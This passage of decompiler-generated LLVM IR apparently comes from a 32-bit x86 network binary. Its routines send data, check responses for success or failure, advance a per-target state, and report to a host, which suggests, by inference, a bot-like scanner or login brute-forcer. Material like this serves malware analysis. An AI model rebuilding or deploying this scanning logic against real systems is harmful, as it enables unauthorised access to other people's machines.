  %v3_805304c = inttoptr i32 %v2_805304c to i32*
  %v4_805304c = load i32, i32* %v3_805304c, align 4
  store i32 %v4_805304c, i32* @ecx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v3_805305c = inttoptr i32 %v2_80528d5 to i32*
  %v4_805305c = load i32, i32* %v3_805305c, align 16
  store i32 %v4_805305c, i32* %eax.global-to-local, align 4
  %v0_805305f = load i32, i32* @esp, align 4
  %v1_805305f = add i32 %v0_805305f, 12
  %v2_805305f = inttoptr i32 %v1_805305f to i32*
  store i32 16384, i32* %v2_805305f, align 4
  %v0_8053067 = load i32, i32* @ebx, align 4
  %v1_8053067 = load i32, i32* @esp, align 4
  %v2_8053067 = add i32 %v1_8053067, 8
  %v3_8053067 = inttoptr i32 %v2_8053067 to i32*
  store i32 %v0_8053067, i32* %v3_8053067, align 4
  %v0_805306b = load i32, i32* @ecx, align 4
  %v1_805306b = load i32, i32* @esp, align 4
  %v2_805306b = add i32 %v1_805306b, 4
  %v3_805306b = inttoptr i32 %v2_805306b to i32*
  store i32 %v0_805306b, i32* %v3_805306b, align 4
  %v0_805306f = load i32, i32* %eax.global-to-local, align 4
  %v1_805306f = load i32, i32* @esp, align 4
  %v2_805306f = inttoptr i32 %v1_805306f to i32*
  store i32 %v0_805306f, i32* %v2_805306f, align 4
  %v4_8053072 = call i32 @send(i32 %v4_8053017, i32 %stack_var_-624.284, i32 %v2_8052831, i32 %v6_8052909)
  store i32 %v4_8053072, i32* %eax.global-to-local, align 4
  %v2_8053077 = icmp slt i32 %v4_8053072, 0
  %v1_8053079 = icmp eq i1 %v2_8053077, false
  store i32 %v2_8052831, i32* @edx, align 4
  br i1 %v1_8053079, label %dec_label_pc_8053094, label %dec_label_pc_805307b

dec_label_pc_805307b:                             ; preds = %dec_label_pc_8053006
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8053087 = load i32, i32* @esp, align 4
  %v2_8053087 = inttoptr i32 %v1_8053087 to i32*
  store i32 %v2_80528d5, i32* %v2_8053087, align 4
  %v1_805308a = call i32 @reset_ipstate(i32 %v4_8053017)
  store i32 %v1_805308a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8053094:                             ; preds = %dec_label_pc_8053006
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_805309d = load i32, i32* %v3_805305c, align 16
  store i32 %v4_805309d, i32* %eax.global-to-local, align 4
  %v0_80530a0 = load i32, i32* @esp, align 4
  %v1_80530a0 = add i32 %v0_80530a0, 12
  %v2_80530a0 = inttoptr i32 %v1_80530a0 to i32*
  store i32 16384, i32* %v2_80530a0, align 4
  %v0_80530a8 = load i32, i32* @esp, align 4
  %v1_80530a8 = add i32 %v0_80530a8, 8
  %v2_80530a8 = inttoptr i32 %v1_80530a8 to i32*
  store i32 2, i32* %v2_80530a8, align 4
  %v0_80530b0 = load i32, i32* @esp, align 4
  %v1_80530b0 = add i32 %v0_80530b0, 4
  %v2_80530b0 = inttoptr i32 %v1_80530b0 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_806b173.275 to i32), i32* %v2_80530b0, align 4
  %v0_80530b8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80530b8 = load i32, i32* @esp, align 4
  %v2_80530b8 = inttoptr i32 %v1_80530b8 to i32*
  store i32 %v0_80530b8, i32* %v2_80530b8, align 4
  %v4_80530bb = call i32 @send(i32 %v4_8053017, i32 %stack_var_-624.284, i32 %v2_8052831, i32 %v6_8052909)
  %v2_80530c0 = icmp slt i32 %v4_80530bb, 0
  %v1_80530c2 = icmp eq i1 %v2_80530c0, false
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_80530e9 = load i32, i32* @esp, align 4
  br i1 %v1_80530c2, label %dec_label_pc_80530dd, label %dec_label_pc_80530c4

dec_label_pc_80530c4:                             ; preds = %dec_label_pc_8053094
  %v2_80530d0 = inttoptr i32 %v0_80530e9 to i32*
  store i32 %v2_80528d5, i32* %v2_80530d0, align 4
  %v1_80530d3 = call i32 @reset_ipstate(i32 %v4_8053017)
  store i32 %v1_80530d3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_80530dd:                             ; preds = %dec_label_pc_8053094
  %v1_80530e9 = add i32 %v0_80530e9, 4
  %v2_80530e9 = inttoptr i32 %v1_80530e9 to i32*
  store i32 6, i32* %v2_80530e9, align 4
  %v0_80530f1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80530f1 = load i32, i32* @esp, align 4
  %v2_80530f1 = inttoptr i32 %v1_80530f1 to i32*
  store i32 %v0_80530f1, i32* %v2_80530f1, align 4
  %v2_80530f4 = inttoptr i32 %v4_8053017 to i32*
  %v3_80530f4 = call i32 @advance_state(i32* %v2_80530f4, i32 %stack_var_-624.284)
  store i32 %v3_80530f4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_80530fe:                             ; preds = %dec_label_pc_8052900
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  %v1_8053109 = add i32 %v2_80528d5, 28
  store i32 %v1_8053109, i32* %eax.global-to-local, align 4
  %v1_805310c = inttoptr i32 %v1_8053109 to i32*
  %v2_805310c = load i32, i32* %v1_805310c, align 4
  store i32 %v2_805310c, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v3_8053117 = inttoptr i32 %v2_80528d5 to i32*
  %v4_8053117 = load i32, i32* %v3_8053117, align 16
  store i32 %v4_8053117, i32* %edx.global-to-local, align 4
  %v0_805311a = load i32, i32* @esp, align 4
  %v1_805311a = add i32 %v0_805311a, 16
  %v2_805311a = inttoptr i32 %v1_805311a to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_8070d40.279 to i32), i32* %v2_805311a, align 4
  %v0_8053122 = load i32, i32* @esp, align 4
  %v1_8053122 = add i32 %v0_8053122, 12
  %v2_8053122 = inttoptr i32 %v1_8053122 to i32*
  store i32 1024, i32* %v2_8053122, align 4
  %v0_805312a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805312a = load i32, i32* @esp, align 4
  %v2_805312a = add i32 %v1_805312a, 8
  %v3_805312a = inttoptr i32 %v2_805312a to i32*
  store i32 %v0_805312a, i32* %v3_805312a, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_8053131 = load i32, i32* @esp, align 4
  %v2_8053131 = add i32 %v1_8053131, 4
  %v3_8053131 = inttoptr i32 %v2_8053131 to i32*
  store i32 %arg1, i32* %v3_8053131, align 4
  %v0_8053135 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053135 = load i32, i32* @esp, align 4
  %v2_8053135 = inttoptr i32 %v1_8053135 to i32*
  store i32 %v0_8053135, i32* %v2_8053135, align 4
  %v1_8053138 = call i32 @read_until_response(i32 %v6_8052909)
  %v1_805313d = icmp eq i32 %v1_8053138, 0
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v1_80528d7, i32* %eax.global-to-local, align 4
  br i1 %v1_805313d, label %dec_label_pc_8053290, label %dec_label_pc_8053145

dec_label_pc_8053145:                             ; preds = %dec_label_pc_80530fe
  store i32 0, i32* %v1_80528da, align 16
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v1_8053109, i32* %eax.global-to-local, align 4
  %v2_8053167 = load i32, i32* %v1_805310c, align 4
  store i32 %v2_8053167, i32* %eax.global-to-local, align 4
  %v1_8053169 = load i32, i32* @esp, align 4
  %v2_8053169 = inttoptr i32 %v1_8053169 to i32*
  store i32 %v2_8053167, i32* %v2_8053169, align 4
  %v1_805316c = call i32 @contains_fail(i32 %stack_var_-628.278)
  store i32 %v1_805316c, i32* %eax.global-to-local, align 4
  %v1_8053171 = icmp eq i32 %v1_805316c, 0
  store i32 %v2_8052831, i32* @edx, align 4
  br i1 %v1_8053171, label %dec_label_pc_8053196, label %dec_label_pc_8053175

dec_label_pc_8053175:                             ; preds = %dec_label_pc_8053145
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_8053181 = load i32, i32* @esp, align 4
  %v1_8053181 = add i32 %v0_8053181, 4
  %v2_8053181 = inttoptr i32 %v1_8053181 to i32*
  store i32 0, i32* %v2_8053181, align 4
  %v0_8053189 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053189 = load i32, i32* @esp, align 4
  %v2_8053189 = inttoptr i32 %v1_8053189 to i32*
  store i32 %v0_8053189, i32* %v2_8053189, align 4
  %v2_805318c = inttoptr i32 %stack_var_-628.278 to i32*
  %v3_805318c = call i32 @advance_state(i32* %v2_805318c, i32 %stack_var_-624.284)
  store i32 %v3_805318c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8053196:                             ; preds = %dec_label_pc_8053145
  store i32 %v1_8053109, i32* %eax.global-to-local, align 4
  %v2_80531a4 = load i32, i32* %v1_805310c, align 4
  store i32 %v2_80531a4, i32* %eax.global-to-local, align 4
  %v1_80531a6 = load i32, i32* @esp, align 4
  %v2_80531a6 = inttoptr i32 %v1_80531a6 to i32*
  store i32 %v2_80531a4, i32* %v2_80531a6, align 4
  %v1_80531a9 = call i32 @contains_success(i32 %stack_var_-628.278)
  store i32 %v1_80531a9, i32* %eax.global-to-local, align 4
  %v1_80531ae = icmp eq i32 %v1_80531a9, 0
  store i32 %v2_8052831, i32* @edx, align 4
  br i1 %v1_80531ae, label %dec_label_pc_8053277, label %dec_label_pc_80531b6

dec_label_pc_80531b6:                             ; preds = %dec_label_pc_8053196
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_80531bf = or i32 %v2_80528d2, 9
  %v3_80531bf = add i32 %v2_80531bf, %v2_8052831
  %v4_80531bf = inttoptr i32 %v3_80531bf to i8*
  %v5_80531bf = load i8, i8* %v4_80531bf, align 1
  %v6_80531bf = zext i8 %v5_80531bf to i32
  store i32 %v6_80531bf, i32* %eax.global-to-local, align 4
  %v10_80531c4 = icmp eq i8 %v5_80531bf, 2
  %v1_80531c6 = icmp eq i1 %v10_80531c4, false
  store i32 %v2_8052831, i32* @edx, align 4
  br i1 %v1_80531c6, label %dec_label_pc_80531e9, label %dec_label_pc_80531c8

dec_label_pc_80531c8:                             ; preds = %dec_label_pc_80531b6
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_80531d4 = load i32, i32* @esp, align 4
  %v1_80531d4 = add i32 %v0_80531d4, 4
  %v2_80531d4 = inttoptr i32 %v1_80531d4 to i32*
  store i32 7, i32* %v2_80531d4, align 4
  %v0_80531dc = load i32, i32* %eax.global-to-local, align 4
  %v1_80531dc = load i32, i32* @esp, align 4
  %v2_80531dc = inttoptr i32 %v1_80531dc to i32*
  store i32 %v0_80531dc, i32* %v2_80531dc, align 4
  %v2_80531df = inttoptr i32 %stack_var_-628.278 to i32*
  %v3_80531df = call i32 @advance_state(i32* %v2_80531df, i32 %stack_var_-624.284)
  store i32 %v3_80531df, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_80531e9:                             ; preds = %dec_label_pc_80531b6
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_80531f2 = or i32 %v2_80528d2, 11
  %v3_80531f2 = add i32 %v2_80531f2, %v2_8052831
  %v4_80531f2 = inttoptr i32 %v3_80531f2 to i8*
  %v5_80531f2 = load i8, i8* %v4_80531f2, align 1
  %v6_80531f2 = zext i8 %v5_80531f2 to i32
  store i32 %v6_80531f2, i32* %eax.global-to-local, align 4
  %v1_80531fa = mul nuw nsw i32 %v6_80531f2, 4
  %v2_80531fa = add nuw nsw i32 %v1_80531fa, 134679296
  %v3_80531fa = inttoptr i32 %v2_80531fa to i32*
  %v4_80531fa = load i32, i32* %v3_80531fa, align 4
  store i32 %v4_80531fa, i32* @ebx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_805320a = or i32 %v2_80528d2, 10
  %v3_805320a = add i32 %v2_805320a, %v2_8052831
  %v4_805320a = inttoptr i32 %v3_805320a to i8*
  %v5_805320a = load i8, i8* %v4_805320a, align 2
  %v6_805320a = zext i8 %v5_805320a to i32
  store i32 %v6_805320a, i32* %eax.global-to-local, align 4
  %v1_8053212 = mul nuw nsw i32 %v6_805320a, 4
  %v2_8053212 = add nuw nsw i32 %v1_8053212, 134678880
  %v3_8053212 = inttoptr i32 %v2_8053212 to i32*
  %v4_8053212 = load i32, i32* %v3_8053212, align 4
  store i32 %v4_8053212, i32* @esi, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8053225 = load i32, i32* @esp, align 4
  %v2_8053225 = inttoptr i32 %v1_8053225 to i32*
  store i32 %v2_80528d5, i32* %v2_8053225, align 4
  %v0_8053228 = call i32 @get_ipstate_host()
  %v0_805322d = load i32, i32* @global_var_807f34c.280, align 4
  store i32 %v0_805322d, i32* %edx.global-to-local, align 4
  %v0_8053233 = load i32, i32* @ebx, align 4
  %v1_8053233 = load i32, i32* @esp, align 4
  %v2_8053233 = add i32 %v1_8053233, 20
  %v3_8053233 = inttoptr i32 %v2_8053233 to i32*
  store i32 %v0_8053233, i32* %v3_8053233, align 4
  %v0_8053237 = load i32, i32* @esi, align 4
  %v1_8053237 = load i32, i32* @esp, align 4
  %v2_8053237 = add i32 %v1_8053237, 16
  %v3_8053237 = inttoptr i32 %v2_8053237 to i32*
  store i32 %v0_8053237, i32* %v3_8053237, align 4
  %v1_805323b = load i32, i32* @esp, align 4
  %v2_805323b = add i32 %v1_805323b, 12
  %v3_805323b = inttoptr i32 %v2_805323b to i32*
  store i32 %v0_8053228, i32* %v3_805323b, align 4
  %v0_805323f = load i32, i32* %edx.global-to-local, align 4
  %v1_805323f = load i32, i32* @esp, align 4
  %v2_805323f = add i32 %v1_805323f, 8
  %v3_805323f = inttoptr i32 %v2_805323f to i32*
  store i32 %v0_805323f, i32* %v3_805323f, align 4
  %v0_8053243 = load i32, i32* @esp, align 4
  %v1_8053243 = add i32 %v0_8053243, 4
  %v2_8053243 = inttoptr i32 %v1_8053243 to i32*
  store i32 ptrtoint ([44 x i8]* @global_var_806b178.281 to i32), i32* %v2_8053243, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_805324e = load i32, i32* @esp, align 4
  %v2_805324e = inttoptr i32 %v1_805324e to i32*
  store i32 %arg3, i32* %v2_805324e, align 4
  %v2_8053251 = call i32 @Send(i32 %stack_var_-628.278, i32 %stack_var_-624.284)
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_8053262 = load i32, i32* @esp, align 4
  %v1_8053262 = add i32 %v0_8053262, 4
  %v2_8053262 = inttoptr i32 %v1_8053262 to i32*
  store i32 7, i32* %v2_8053262, align 4
  %v0_805326a = load i32, i32* %eax.global-to-local, align 4
  %v1_805326a = load i32, i32* @esp, align 4
  %v2_805326a = inttoptr i32 %v1_805326a to i32*
  store i32 %v0_805326a, i32* %v2_805326a, align 4
  %v2_805326d = inttoptr i32 %stack_var_-628.278 to i32*
  %v3_805326d = call i32 @advance_state(i32* %v2_805326d, i32 %stack_var_-624.284)
  store i32 %v3_805326d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8053277:                             ; preds = %dec_label_pc_8053196
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8053283 = load i32, i32* @esp, align 4
  %v2_8053283 = inttoptr i32 %v1_8053283 to i32*
  store i32 %v2_80528d5, i32* %v2_8053283, align 4
  %v1_8053286 = call i32 @reset_ipstate(i32 %stack_var_-628.278)
  store i32 %v1_8053286, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8053290:                             ; preds = %dec_label_pc_80530fe
  %v2_805329e = load i32, i32* %v1_80528da, align 16
  store i32 %v2_805329e, i32* %eax.global-to-local, align 4
  %v1_80532a0 = add i32 %v2_805329e, 7
  store i32 %v1_80532a0, i32* @ebx, align 4
  %v0_80532a3 = load i32, i32* @esp, align 4
  %v1_80532a3 = inttoptr i32 %v0_80532a3 to i32*
  store i32 0, i32* %v1_80532a3, align 4
  %v1_80532aa = inttoptr i32 %stack_var_-628.278 to i32*
  %v2_80532aa = call i32 @__GI_time(i32* %v1_80532aa)
  store i32 %v2_80532aa, i32* %eax.global-to-local, align 4
  %v0_80532af = load i32, i32* @ebx, align 4
  %v7_80532af = icmp ult i32 %v0_80532af, %v2_80532aa
  %v1_80532b1 = icmp eq i1 %v7_80532af, false
  br i1 %v1_80532b1, label %dec_label_pc_805372c, label %dec_label_pc_80532b7

dec_label_pc_80532b7:                             ; preds = %dec_label_pc_8053290
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_80532c3 = load i32, i32* @esp, align 4
  %v2_80532c3 = inttoptr i32 %v1_80532c3 to i32*
  store i32 %v2_80528d5, i32* %v2_80532c3, align 4
  %v1_80532c6 = call i32 @reset_ipstate(i32 %stack_var_-628.278)
  store i32 %v1_80532c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_80532d0:                             ; preds = %dec_label_pc_8052900
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80528da, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_805338e = inttoptr i32 %v2_80528d5 to i32*
  br label %dec_label_pc_80532f0

dec_label_pc_80532f0:                             ; preds = %dec_label_pc_80532d0, %dec_label_pc_80533c7
  %storemerge454 = phi i32 [ 0, %dec_label_pc_80532d0 ], [ %v4_80533c7, %dec_label_pc_80533c7 ]
  %v0_80532f0 = load i32, i32* @esp, align 4
  %v1_80532f0 = add i32 %v0_80532f0, 8
  %v2_80532f0 = inttoptr i32 %v1_80532f0 to i32*
  store i32 128, i32* %v2_80532f0, align 4
  %v0_80532f8 = load i32, i32* @esp, align 4
  %v1_80532f8 = add i32 %v0_80532f8, 4
  %v2_80532f8 = inttoptr i32 %v1_80532f8 to i32*
  store i32 0, i32* %v2_80532f8, align 4
  store i32 %v2_8053300, i32* %eax.global-to-local, align 4
  %v1_8053306 = load i32, i32* @esp, align 4
  %v2_8053306 = inttoptr i32 %v1_8053306 to i32*
  store i32 %v2_8053300, i32* %v2_8053306, align 4
  %v3_8053309 = inttoptr i32 %storemerge454 to i8*
  %v4_8053309 = call i32 @__GI_memset(i8* %v3_8053309, i32 %stack_var_-56.0, i32 %storemerge85)
  store i32 %storemerge454, i32* %eax.global-to-local, align 4
  %v1_8053311 = mul i32 %storemerge454, 4
  %v2_8053311 = add i32 %v1_8053311, ptrtoint ([4 x i8*]* @global_var_8070d6c.285 to i32)
  %v3_8053311 = inttoptr i32 %v2_8053311 to i32*
  %v4_8053311 = load i32, i32* %v3_8053311, align 4
  store i32 %v4_8053311, i32* %edx.global-to-local, align 4
  store i32 %storemerge454, i32* %eax.global-to-local, align 4
  %v4_805331b = load i32, i32* %v3_8053311, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_805332d = and i32 %v4_805331b, -256
  store i32 %v1_805332d, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8053330 = inttoptr i32 %v4_805331b to i8*
  store i32 %v4_805331b, i32* @edi, align 4
  %v3_8053336 = call i32 @_strlen(i8* %v4_8053330)
  %v4_8053336 = mul i32 %v3_8053336, -1
  %v5_8053336 = add i32 %v4_8053336, -2
  store i32 %v5_8053336, i32* %ecx.global-to-local, align 4
  %v1_805333d = sub i32 2, %v4_8053336
  store i32 %v1_805333d, i32* %eax.global-to-local, align 4
  %v0_8053340 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053340 = load i32, i32* @esp, align 4
  %v2_8053340 = add i32 %v1_8053340, 12
  %v3_8053340 = inttoptr i32 %v2_8053340 to i32*
  store i32 %v0_8053340, i32* %v3_8053340, align 4
  %v0_8053344 = load i32, i32* @esp, align 4
  %v1_8053344 = add i32 %v0_8053344, 8
  %v2_8053344 = inttoptr i32 %v1_8053344 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_806b1a4.286 to i32), i32* %v2_8053344, align 4
  %v0_805334c = load i32, i32* %eax.global-to-local, align 4
  %v1_805334c = load i32, i32* @esp, align 4
  %v2_805334c = add i32 %v1_805334c, 4
  %v3_805334c = inttoptr i32 %v2_805334c to i32*
  store i32 %v0_805334c, i32* %v3_805334c, align 4
  store i32 %v2_8053300, i32* %eax.global-to-local, align 4
  %v1_8053356 = load i32, i32* @esp, align 4
  %v2_8053356 = inttoptr i32 %v1_8053356 to i32*
  store i32 %v2_8053300, i32* %v2_8053356, align 4
  %v6_8053359 = load i32, i32* %stack_var_-608, align 4
  %v7_8053359 = call i32 @__GI_snprintf(i32 %v4_805331b, i32 %stack_var_-628.278, i32 %stack_var_-624.284, i32 %v2_8052831, i32 %v6_8052909, i32 %v15_805272a, i32 %v6_8053359)
  store i32 %storemerge454, i32* %eax.global-to-local, align 4
  %v4_8053361 = load i32, i32* %v3_8053311, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8053373 = and i32 %v4_8053361, -256
  store i32 %v1_8053373, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8053376 = inttoptr i32 %v4_8053361 to i8*
  store i32 %v4_8053361, i32* @edi, align 4
  %v3_805337c = call i32 @_strlen(i8* %v4_8053376)
  store i32 %v3_805337c, i32* @ecx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_805338e = load i32, i32* %v3_805338e, align 16
  store i32 %v4_805338e, i32* %edx.global-to-local, align 4
  %v0_8053391 = load i32, i32* @esp, align 4
  %v1_8053391 = add i32 %v0_8053391, 12
  %v2_8053391 = inttoptr i32 %v1_8053391 to i32*
  store i32 16384, i32* %v2_8053391, align 4
  %v0_8053399 = load i32, i32* @ecx, align 4
  %v1_8053399 = load i32, i32* @esp, align 4
  %v2_8053399 = add i32 %v1_8053399, 8
  %v3_8053399 = inttoptr i32 %v2_8053399 to i32*
  store i32 %v0_8053399, i32* %v3_8053399, align 4
  store i32 %v2_8053300, i32* %eax.global-to-local, align 4
  %v1_80533a3 = load i32, i32* @esp, align 4
  %v2_80533a3 = add i32 %v1_80533a3, 4
  %v3_80533a3 = inttoptr i32 %v2_80533a3 to i32*
  store i32 %v2_8053300, i32* %v3_80533a3, align 4
  %v0_80533a7 = load i32, i32* %edx.global-to-local, align 4
  %v1_80533a7 = load i32, i32* @esp, align 4
  %v2_80533a7 = inttoptr i32 %v1_80533a7 to i32*
  store i32 %v0_80533a7, i32* %v2_80533a7, align 4
  %v4_80533aa = call i32 @send(i32 %v4_8053361, i32 %v4_805331b, i32 %stack_var_-628.278, i32 %stack_var_-624.284)
  store i32 %v4_80533aa, i32* %eax.global-to-local, align 4
  %v2_80533af = icmp slt i32 %v4_80533aa, 0
  %v1_80533b1 = icmp eq i1 %v2_80533af, false
  br i1 %v1_80533b1, label %dec_label_pc_80533c7, label %dec_label_pc_80533b3

dec_label_pc_80533b3:                             ; preds = %dec_label_pc_80532f0
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_80533bf = load i32, i32* @esp, align 4
  %v2_80533bf = inttoptr i32 %v1_80533bf to i32*
  store i32 %v2_80528d5, i32* %v2_80533bf, align 4
  %v1_80533c2 = call i32 @reset_ipstate(i32 %v4_8053361)
  store i32 %v1_80533c2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533c7

dec_label_pc_80533c7:                             ; preds = %dec_label_pc_80532f0, %dec_label_pc_80533b3
  %v4_80533c7 = add i32 %storemerge454, 1
  store i32 %v4_80533c7, i32* %eax.global-to-local, align 4
  %tmp104 = icmp ult i32 %v4_80533c7, 5
  br i1 %tmp104, label %dec_label_pc_80532f0, label %dec_label_pc_8053569.preheader

dec_label_pc_8053569.preheader:                   ; preds = %dec_label_pc_80533c7
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_805356f62, label %dec_label_pc_80533e2, label %dec_label_pc_8053575

dec_label_pc_80533e2:                             ; preds = %dec_label_pc_8053569.preheader, %dec_label_pc_8053566
  %storemerge265 = phi i32 [ %v4_8053566, %dec_label_pc_8053566 ], [ 0, %dec_label_pc_8053569.preheader ]
  %stack_var_-644.264 = phi i32 [ %stack_var_-644.1, %dec_label_pc_8053566 ], [ %stack_var_-644.482, %dec_label_pc_8053569.preheader ]
  %stack_var_-640.263 = phi i32 [ %stack_var_-640.1, %dec_label_pc_8053566 ], [ %stack_var_-640.481, %dec_label_pc_8053569.preheader ]
  %v0_80533e2 = load i32, i32* @esp, align 4
  %v1_80533e2 = add i32 %v0_80533e2, 8
  %v2_80533e2 = inttoptr i32 %v1_80533e2 to i32*
  store i32 128, i32* %v2_80533e2, align 4
  %v0_80533ea = load i32, i32* @esp, align 4
  %v1_80533ea = add i32 %v0_80533ea, 4
  %v2_80533ea = inttoptr i32 %v1_80533ea to i32*
  store i32 0, i32* %v2_80533ea, align 4
  store i32 %v2_8053300, i32* %eax.global-to-local, align 4
  %v1_80533f8 = load i32, i32* @esp, align 4
  %v2_80533f8 = inttoptr i32 %v1_80533f8 to i32*
  store i32 %v2_8053300, i32* %v2_80533f8, align 4
  %v3_80533fb = inttoptr i32 %storemerge265 to i8*
  %v4_80533fb = call i32 @__GI_memset(i8* %v3_80533fb, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v4_8053400 = icmp eq i32 %storemerge265, 0
  %v1_8053404 = icmp eq i1 %v4_8053400, false
  store i32 %storemerge265, i32* %eax.global-to-local, align 4
  %v1_8053498 = mul i32 %storemerge265, 4
  %v2_8053498 = add i32 %v1_8053498, ptrtoint ([7 x i8*]* @global_var_8070d00.294 to i32)
  %v3_8053498 = inttoptr i32 %v2_8053498 to i32*
  %v4_8053498 = load i32, i32* %v3_8053498, align 4
  store i32 %v4_8053498, i32* %edx.global-to-local, align 4
  store i32 %storemerge265, i32* %eax.global-to-local, align 4
  %v4_80534a2 = load i32, i32* %v3_8053498, align 4
  store i32 %v4_80534a2, i32* @ebx, align 4
  store i32 %storemerge265, i32* %eax.global-to-local, align 4
  %v4_80534ac = load i32, i32* %v3_8053498, align 4
  store i32 %v4_80534ac, i32* @esi, align 4
  store i32 %storemerge265, i32* %eax.global-to-local, align 4
  %v4_80534b6 = load i32, i32* %v3_8053498, align 4
  store i32 %v4_80534b6, i32* %eax.global-to-local, align 4
  br i1 %v1_8053404, label %dec_label_pc_8053495, label %dec_label_pc_805340a

dec_label_pc_805340a:                             ; preds = %dec_label_pc_80533e2
  store i32 %storemerge265, i32* %eax.global-to-local, align 4
  %v4_805343b = load i32, i32* %v3_8053498, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_805344d = and i32 %v4_805343b, -256
  store i32 %v1_805344d, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8053450 = inttoptr i32 %v4_805343b to i8*
  store i32 %v4_805343b, i32* @edi, align 4
  %v3_8053456 = call i32 @_strlen(i8* %v4_8053450)
  %v4_8053456 = mul i32 %v3_8053456, -1
  %v5_8053456 = add i32 %v4_8053456, -2
  store i32 %v5_8053456, i32* %ecx.global-to-local, align 4
  %v2_805345d = mul i32 %v3_8053456, 4
  %v1_8053460 = add i32 %v2_805345d, 58
  store i32 %v1_8053460, i32* %eax.global-to-local, align 4
  %v0_8053463 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053463 = load i32, i32* @esp, align 4
  %v2_8053463 = add i32 %v1_8053463, 24
  %v3_8053463 = inttoptr i32 %v2_8053463 to i32*
  store i32 %v0_8053463, i32* %v3_8053463, align 4
  %v0_8053467 = load i32, i32* @ebx, align 4
  %v1_8053467 = load i32, i32* @esp, align 4
  %v2_8053467 = add i32 %v1_8053467, 20
  %v3_8053467 = inttoptr i32 %v2_8053467 to i32*
  store i32 %v0_8053467, i32* %v3_8053467, align 4
  %v0_805346b = load i32, i32* @esi, align 4
  %v1_805346b = load i32, i32* @esp, align 4
  %v2_805346b = add i32 %v1_805346b, 16
  %v3_805346b = inttoptr i32 %v2_805346b to i32*
  store i32 %v0_805346b, i32* %v3_805346b, align 4
  store i32 %v4_80534b6, i32* %edx.global-to-local, align 4
  %v1_8053475 = load i32, i32* @esp, align 4
  %v2_8053475 = add i32 %v1_8053475, 12
  %v3_8053475 = inttoptr i32 %v2_8053475 to i32*
  store i32 %v4_80534b6, i32* %v3_8053475, align 4
  %v0_8053479 = load i32, i32* @esp, align 4
  %v1_8053479 = add i32 %v0_8053479, 8
  %v2_8053479 = inttoptr i32 %v1_8053479 to i32*
  store i32 ptrtoint ([65 x i8]* @global_var_806b1ac.295 to i32), i32* %v2_8053479, align 4
  %v0_8053481 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053481 = load i32, i32* @esp, align 4
  %v2_8053481 = add i32 %v1_8053481, 4
  %v3_8053481 = inttoptr i32 %v2_8053481 to i32*
  store i32 %v0_8053481, i32* %v3_8053481, align 4
  store i32 %v2_8053300, i32* %eax.global-to-local, align 4
  %v1_805348b = load i32, i32* @esp, align 4
  %v2_805348b = inttoptr i32 %v1_805348b to i32*
  store i32 %v2_8053300, i32* %v2_805348b, align 4
